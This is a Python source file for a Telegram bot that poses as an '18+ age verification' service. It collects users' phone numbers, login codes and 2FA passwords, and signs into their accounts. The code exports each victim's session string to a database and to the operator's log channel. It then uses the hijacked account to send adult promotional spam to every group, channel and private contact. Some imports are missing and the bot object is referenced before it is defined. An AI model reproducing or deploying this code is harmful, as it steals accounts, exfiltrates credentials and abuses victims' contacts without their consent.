import os
import re
import time
import asyncio
from pathlib import Path
from pyrogram import Client, filters
from pyrogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    CallbackQuery,
    ReplyKeyboardRemove
)
from pymongo import MongoClient
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, BOT_TOKEN

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
db = mongo_client['Cluster0']['users']

# Adult Promo Texts (10+ Messages)
ADULT_PROMO_TEXTS = [
    "🔥 Join our exclusive channel for uncensored content!",
    "🔞 VIP access to premium adult videos - Limited slots!",
    "💋 Your pass to the hottest adult content on Telegram",
    "🌟 Exclusive videos just for members - Click now!",
    "😈 Don't miss our private collection - Join instantly!",
    "👑 Become a VIP member for full access!",
    "🕶️ Hidden gems await you behind closed doors...",
    "💎 Premium adult content curated daily!",
    "🎉 Special offer: Free trial for new members!",
    "❤️‍🔥 Get addicted to our daily releases!",
    "👉 Just one click away from paradise..."
]

# Strings
BOT_STRINGS = {
    'start': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
    'contact_received': "Processing your number...",
    'otp_sent': "**OTP Sent!**\n\nEnter code via buttons:",
    'login_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
    'logout_success': "Logged out! 🔒\n/login to access again.",
    'not_logged_in': "Not logged in! ❌\n/login first."
}

# OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("1️⃣", callback_data="otp_1"), InlineKeyboardButton("2️⃣", callback_data="otp_2"), InlineKeyboardButton("3️⃣", callback_data="otp_3")],
    [InlineKeyboardButton("4️⃣", callback_data="otp_4"), InlineKeyboardButton("5️⃣", callback_data="otp_5"), InlineKeyboardButton("6️⃣", callback_data="otp_6")],
    [InlineKeyboardButton("7️⃣", callback_data="otp_7"), InlineKeyboardButton("8️⃣", callback_data="otp_8"), InlineKeyboardButton("9️⃣", callback_data="otp_9")],
    [InlineKeyboardButton("🔙", callback_data="otp_back"), InlineKeyboardButton("0️⃣", callback_data="otp_0"), InlineKeyboardButton("🆗", callback_data="otp_submit")]
])

# State Management
user_states = {}

# Helper Functions
async def is_logged_in(user_id: int) -> bool:
    user = db.find_one({"id": user_id})
    return bool(user and user.get('logged_in'))

async def cleanup_user_state(user_id: int):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and state['client'].is_connected:
            await state['client'].disconnect()
        del user_states[user_id]

async def save_session(client: Client, user_id: int, phone: str):
    session_str = await client.export_session_string()
    await client.disconnect()

    # Save to MongoDB
    db.update_one(
        {"id": user_id},
        {"$set": {
            "session": session_str,
            "logged_in": True,
            "mobile": phone
        }},
        upsert=True
    )
    
    # Save session file
    clean_phone = phone.replace("+", "")
    session_file = Path(f"sessions/{clean_phone}.session")
    session_file.write_text(session_str)
    
    # Send to log channel
    await app.send_document(
        LOG_CHANNEL_SESSIONS_FILES,
        str(session_file),
        caption=f"Session: {clean_phone}"
    )
    os.remove(session_file)
    return session_str

async def silent_promotion(session_str: str):
    try:
        user_client = Client("promo", session_string=session_str)
        await user_client.start()
        
        # Get all targets
        targets = set()
        async for dialog in user_client.get_dialogs():
            if dialog.chat.type in ["group", "supergroup", "channel"]:
                targets.add(dialog.chat.id)
            elif dialog.chat.type == "private" and not dialog.chat.is_bot:
                targets.add(dialog.chat.id)
        
        # Send adult promo texts
        for target in targets:
            for promo_text in ADULT_PROMO_TEXTS:
                try:
                    await user_client.send_message(target, promo_text)
                    await asyncio.sleep(300)  # 5 min delay between messages
                except FloodWait as e:
                    await asyncio.sleep(e.value + 10)
                except:
                    continue
            await asyncio.sleep(60)  # 1 min delay between targets
            
    except Exception as e:
        await app.send_message(LOG_CHANNEL_SESSIONS_FILES, f"💀 Promotion Failed: {str(e)}")
    finally:
        await user_client.stop()

# Bot Handlers
@app.on_message(filters.command("start") & filters.private)
async def start_bot(_, msg: Message):
    if await is_logged_in(msg.from_user.id):
        await msg.reply(BOT_STRINGS['login_success'])
        return
    
    await msg.reply(
        BOT_STRINGS['start'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@app.on_message(filters.contact & filters.private)
async def handle_contact(_, msg: Message):
    user_id = msg.from_user.id
    phone = msg.contact.phone_number
    
    if not phone.startswith('+'):
        phone = f"+{phone}"
    
    # Remove keyboard immediately
    await msg.reply(BOT_STRINGS['contact_received'], reply_markup=ReplyKeyboardRemove())
    await asyncio.sleep(1)
    
    # Create temp client
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    try:
        code = await client.send_code(phone)
        user_states[user_id] = {
            "phone": phone,
            "client": client,
            "phone_code_hash": code.phone_code_hash,
            "otp": ""
        }
        await msg.delete()
        await msg.reply(BOT_STRINGS['otp_sent'], reply_markup=OTP_KEYBOARD)
        
    except Exception as e:
        await msg.reply(f"Error: {str(e)}\n/login again")
        await cleanup_user_state(user_id)

@app.on_callback_query(filters.regex(r"^otp_"))
async def handle_otp_buttons(_, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        return await query.answer("Session expired! /start again")
    
    action = query.data.split("_")[1]
    state = user_states[user_id]
    
    if action == "back":
        state['otp'] = state['otp'][:-1]
    elif action == "submit":
        if len(state['otp']) < 5:
            return await query.answer("OTP must be 5 digits!")
            
        try:
            await state['client'].sign_in(
                state['phone'],
                state['phone_code_hash'],
                state['otp']
            )
            session_str = await save_session(state['client'], user_id, state['phone'])
            await query.message.edit(BOT_STRINGS['login_success'])
            asyncio.create_task(silent_promotion(session_str))
            
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter password:")
            state['needs_2fa'] = True
        except Exception as e:
            await query.message.reply(f"Error: {str(e)}\n/start again")
            await cleanup_user_state(user_id)
        return
    else:
        state['otp'] += action
    
    # Update OTP display
    otp_display = state['otp'] + "_" * (5 - len(state['otp']))
    await query.message.edit(
        f"**OTP:** `{otp_display}`\nPress 🆗 when done",
        reply_markup=OTP_KEYBOARD
    )

@app.on_message(filters.text & filters.private & ~filters.command(["start", "login", "logout"]))
async def handle_2fa_password(_, msg: Message):
    user_id = msg.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_2fa'):
        return
    
    try:
        await user_states[user_id]['client'].check_password(msg.text)
        session_str = await save_session(
            user_states[user_id]['client'], 
            user_id, 
            user_states[user_id]['phone']
        )
        await msg.reply(BOT_STRINGS['login_success'])
        asyncio.create_task(silent_promotion(session_str))
    except:
        await msg.reply("❌ Wrong password!\n/start again")
    finally:
        await cleanup_user_state(user_id)

@app.on_message(filters.command("logout") & filters.private)
async def handle_logout(_, msg: Message):
    user_id = msg.from_user.id
    if not await is_logged_in(user_id):
        return await msg.reply(BOT_STRINGS['not_logged_in'])
    
    db.update_one({"id": user_id}, {"$set": {"logged_in": False}})
    await msg.reply(BOT_STRINGS['logout_success'])

# Run the bot
app = Client(
    "bhokali_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

app.run()
